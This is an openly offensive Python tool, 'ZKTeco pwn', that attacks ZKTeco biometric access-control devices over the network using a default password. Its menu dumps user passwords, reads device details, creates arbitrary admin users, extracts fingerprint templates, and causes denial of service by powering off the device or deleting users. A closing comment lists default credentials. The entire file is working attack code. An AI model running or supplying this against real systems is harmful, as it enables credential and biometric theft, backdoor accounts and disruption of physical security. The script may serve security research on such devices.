from zk import ZK, const

def get_admin_users(conn):
    print("\n[+] Fetching Admin Users...")
    # Your logic to get admin users goes here
    users = conn.get_users()
    for user in users:
        privilege = 'User'
        if user.privilege == const.USER_ADMIN:
            privilege = 'Admin'
            print ('+ UID #{}'.format(user.uid))
            print ('  Name       : {}'.format(user.name))
            print ('  Privilege  : {}'.format(privilege))
            print ('  Password   : {}'.format(user.password))
            print ('  Group ID   : {}'.format(user.group_id))
            print ('  User  ID   : {}'.format(user.user_id))

def get_all_users(conn):
    print("\n[+] Fetching All Users...")
    # Your logic to get all users goes here
    users = conn.get_users()
    for user in users:
        if user.privilege == const.USER_ADMIN:
            privilege = 'Admin'
        else:
            privilege = 'User'
        print ('+ UID #{}'.format(user.uid))
        print ('  Name       : {}'.format(user.name))
        print ('  Password   : {}'.format(user.password))
        print ('  Privilege  : {}'.format(privilege))
        print ('  Group ID   : {}'.format(user.group_id))
        print ('  User  ID   : {}'.format(user.user_id))

def get_device_info(conn):
    print("\n[+] Fetching Biometric Device Information...")
    # Your logic to get device information goes here
    conn.get_firmware_version()
    print("Serial Number: "+conn.get_serialnumber())
    print("Platform: "+conn.get_platform())
    print("Device_Name: "+conn.get_device_name())
    print("Face Version: "+str(conn.get_face_version()))
    print("FP Versionn: "+str(conn.get_fp_version()))
    print("Extend FMT: "+str(conn.get_extend_fmt()))
    print("User Extend FMT: "+str(conn.get_user_extend_fmt()))
    print("Face Fun On: "+str(conn.get_face_fun_on()))
    print("Compat Old Firmware: "+str(conn.get_compat_old_firmware()))
    print("Network Params: "+str(conn.get_network_params()))
    print("MAC: "+str(conn.get_mac()))
    print("PIN WIDTH: "+str(conn.get_pin_width()))

def create_user(conn):
    print("\n[+] Creating a new user...")
    # Your logic to create a user goes here
    name=input("Enter the name and lastname: ")
    password=input("Enter the password: ")
    id=input("Enter the id: ")
    priv = input("User privileges (1. Admin, 2. Default):")
    if priv == "1":
        user = const.USER_ADMIN
    if priv == "2":
        user = const.USER_DEFAULT
    conn.set_user(uid=int(id), name=name, privilege=user, password=password, group_id='', user_id=id, card=0)
    print("!!!!!!User created successfull!!!!!!")

def get_fingerprint(conn):
    # Get  a single Fingerprint (will return a Finger object)
    uid=int(input("Enter the user id: "))
    temp_id=int(input("Enter the fingerprint number (01234 56789): "))
    template = conn.get_user_template(uid=uid, temp_id=temp_id) #temp_id is the finger to read 0~9
    if template:
        print("Fingerprint: ")
        print(template)
    else:
        print("----> Error: The fingerprint dont exist!")

def denial_of_service(conn):
    option = input("Enter 1 to power off or enter 2 to delete user: ")
    if option == "1":
        conn.poweroff()
        print("-----> Device is power off!!!")
    elif option == "2":
        uid = int(input("Enter the user id: "))
        conn.delete_user(uid=uid)
        print("-----> User deleted!!!")
    else:
        print("Choose valid option")
    


def main(conn):
    banner = """
    

░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
     ░▒▓██▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓██▓▒░  ░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██▓▒░    ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░  
                                                                               
                                                                               
            ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░                     
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                    
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                    
            ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                    
            ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                    
            ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░                    
            ░▒▓█▓▒░       ░▒▓█████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░                    
                                                                               
    """
    print(banner)
    print("              ZKTeco pwn v.1.0 - Main Menu    ")
    print("                 Author: Danilo Erazo       ")
    print("               Company: Reverse Everything  ")
    print("          Social Networks: @revers3everything  ")
    print("             ==============================")
    while True:
        print("\n\n1. Get Admin Users")
        print("2. Get All Users")
        print("3. Get Information about Biometric Device")
        print("4. Create an Arbitrary User")
        print("5. Get a fingerprint")
        print("6. Denial of Service")
        print("7. Exit")
        print("==============================")

        choice = input("Please select an option (1-7): ")

        if choice == '1':
            get_admin_users(conn)
        elif choice == '2':
            get_all_users(conn)
        elif choice == '3':
            get_device_info(conn)
        elif choice == '4':
            create_user(conn)
        elif choice == '5':
            get_fingerprint(conn)
        elif choice == '6':
            denial_of_service(conn)
        elif choice == '7':
            print("\nExiting program. Reverse Everything!!")
            break
        else:
            print("\nInvalid choice. Please try again.")


if __name__ == "__main__":
    # create ZK instance
    conn = None
    zk = ZK('192.168.1.201', port=4370, timeout=5, password=0, force_udp=False, ommit_ping=False)
    try:
        # connect to device
        conn = zk.connect()
        # disable device, this method ensures no activity on the device while the process is run
        conn.disable_device()
        conn.test_voice()
        
        main(conn)

        conn.enable_device()

    except Exception as e:
        print("Process terminate : {}".format(e))
    finally:
        if conn:
            conn.disconnect()

#root:root,solokey,toor,colorkey